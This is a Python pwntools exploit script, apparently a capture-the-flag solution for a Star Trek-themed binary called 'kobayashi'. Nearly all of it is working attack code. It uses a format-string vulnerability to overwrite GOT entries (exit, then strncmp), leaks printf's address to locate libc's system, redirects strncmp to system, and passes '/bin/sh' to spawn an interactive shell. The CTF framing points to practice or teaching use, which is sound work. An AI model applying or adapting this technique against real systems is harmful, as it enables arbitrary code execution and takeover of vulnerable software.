from pwn import *
import binascii

BINARY = "./kobayashi"
HOST, PORT = 'localhost', 1337
LIBC_PATH = '/lib32/libc.so.6'

GDB_SETUP = """
set follow-fork-mode child

#c
"""

context.terminal = ['alacritty', '-e', 'sh', '-c']

if '--live' not in sys.argv:
    p = process(BINARY)
    if '--debug' in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)

e = ELF(BINARY)

exit_addr = e.got['exit']
strncmp_addr = e.got['strncmp']
printf_addr = e.got['printf']
main_addr = 0x080486b1 # e.symbols['main']
leonard_fourth = 0x804aacd # top of dying printf.

p.recvuntil("We have the following options:")

def exploit_printf_from_top(target_location, format_string):
    # Approach with shields up
    p.sendline("2")

    # Use Nyota first and order her to prep med bay
    p.sendline("Nyota")
    p.sendline("1")

    # Use Scotty second and order him to send more power to the shields
    p.sendline("Scotty")
    p.sendline("1")

    # Order Leonard 3rd and order him to shoot weak guns
    p.sendline("Leonard")
    p.sendline("3")

    # Order Leonard 4th and have his death message be an overwrite of mask w/ exit@got
    p.sendline("LeonardA" + p32(target_location))

    p.recvuntil("dying words?\n")
    p.sendline(format_string)

    return p.recvuntil('Everything')

# gdb.attach(p)

# Overwrite exit with order_leonard_fourth function (which has printf vuln in it)
exploit_printf_from_top(exit_addr, "%" + str(leonard_fourth) + "c%16$n")

# Leak address of printf in libc
p.recvuntil("dying words?\n")
p.sendline("%7$s" + p32(printf_addr))
printf = u32(p.recvuntil('Everything')[:4])
print("printf: {}".format(hex(printf)))

# Calculate libc_base and system offset
libc_base = printf - libc.symbols['printf']
system = libc_base + libc.symbols['system']

# Write system byte by byte over strncmp using %hhn
for i in range(4):
    p.recvuntil("dying words?\n")
    payload = '%'
    payload += str(int(hex(system)[2+i*2:4+i*2], 16))
    payload += 'c%9$hhn'
    while(len(payload) < 12):
        payload += 'A'
    payload += p32(strncmp_addr + 3 - i)
    p.sendline(payload)

p.recv(timeout=3)

# Write over exit to point from order_leonard_fourth back to top of main so it
# can hit the strncmp call
payload = "%" + str(main_addr & 0xffff) + 'c'
payload += "%9$hn"
while(len(payload) < 12):
    payload += 'A'
payload += p32(exit_addr)
print(payload)
p.sendline(payload)

# NOTE: We use strncmp here because we control the first argument to it since it is the name of the first person 
#       to order. Since strncmp now points to system then its equivalent to system(name_of_person), which
#       we just set as /bin/sh and then we get the shell

p.recvuntil('2')
p.sendline('2')
p.sendline('/bin/sh')
p.interactive()
